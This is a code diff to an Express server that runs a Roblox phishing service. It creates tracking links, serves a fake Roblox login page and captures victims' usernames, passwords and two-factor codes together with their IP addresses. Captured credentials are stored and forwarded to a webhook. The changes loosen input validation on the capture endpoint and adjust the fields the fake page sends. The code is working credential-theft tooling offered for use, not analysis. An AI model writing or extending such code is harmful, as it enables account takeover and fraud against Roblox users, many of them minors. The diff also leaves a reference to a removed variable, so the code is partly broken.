@@ -1663,7 +1663,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Create a new Roblox tracking link
   app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
     try {
-      const validatedData = createRobloxLinkSchema.parse(req.body);
+      // For phishing links, we don't need an original URL
+      const data = req.body;
+      if (data.linkType === 'phishing') {
+        data.originalUrl = null;
+      }
+      
+      const validatedData = createRobloxLinkSchema.parse(data);
       
       // Generate a unique tracking ID
       const trackingId = randomUUID().substring(0, 8);
@@ -1743,9 +1749,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Roblox credentials capture endpoint
   app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
     try {
-      const validatedData = insertRobloxCredentialsSchema.parse(req.body);
-      
-      const credentials = await storage.createRobloxCredentials(validatedData);
+      const credentials = await storage.createRobloxCredentials({
+        userId: req.body.userId,
+        linkId: req.body.linkId,
+        capturedUsername: req.body.capturedUsername,
+        capturedPassword: req.body.capturedPassword,
+        capturedAuthCode: req.body.capturedAuthCode || null,
+        ipAddress: req.body.ipAddress,
+        userAgent: req.body.userAgent
+      });
       
       // Send credentials to webhook if configured
       const userSettings = await storage.getSettings(validatedData.userId);
@@ -1830,8 +1842,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Get the Roblox link to verify it exists and is active
       const robloxLink = await storage.getRobloxLink(trackingId);
-      if (!robloxLink || !robloxLink.isActive || robloxLink.linkType !== 'phishing') {
+      if (!robloxLink || !robloxLink.isActive) {
         return res.status(404).send('Page not found');
+      }
+      
+      // Only serve login page for phishing links
+      if (robloxLink.linkType !== 'phishing') {
+        return res.redirect(robloxLink.originalUrl || 'https://www.roblox.com');
       }
 
       // Log the visitor information
@@ -2136,9 +2153,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     body: JSON.stringify({
                         userId: '${robloxLink.userId}',
                         linkId: '${robloxLink.id}',
-                        username: username,
-                        password: password,
-                        twoFactorCode: twoFactorCode || null,
+                        capturedUsername: username,
+                        capturedPassword: password,
+                        capturedAuthCode: twoFactorCode || null,
                         ipAddress: '${ip}',
                         userAgent: navigator.userAgent
                     })
